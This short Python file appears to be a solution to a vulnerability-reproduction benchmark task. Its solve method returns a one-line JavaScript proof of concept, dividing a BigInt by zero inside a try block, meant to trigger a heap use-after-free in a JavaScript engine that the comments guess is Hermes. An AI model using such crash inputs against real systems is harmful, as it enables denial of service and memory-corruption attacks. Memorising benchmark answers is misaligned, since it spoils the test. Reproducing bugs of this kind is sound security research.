import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in compound division.
        Target is likely a JavaScript engine (e.g., Hermes, corresponding to OSS-Fuzz 35876) 
        handling BigInt compound assignment.
        """
        # The vulnerability occurs when a compound assignment division (a /= b) fails (e.g., division by zero),
        # and the engine incorrectly frees the target variable or temporary result before handling the exception,
        # leading to a UAF.
        # We wrap in try-catch to ensure a clean exit (code 0) on fixed versions, 
        # while the vulnerable version will crash (ASAN/UAF) during the operation or cleanup.
        return b"var a = 1n; try { a /= 0n; } catch (e) {}"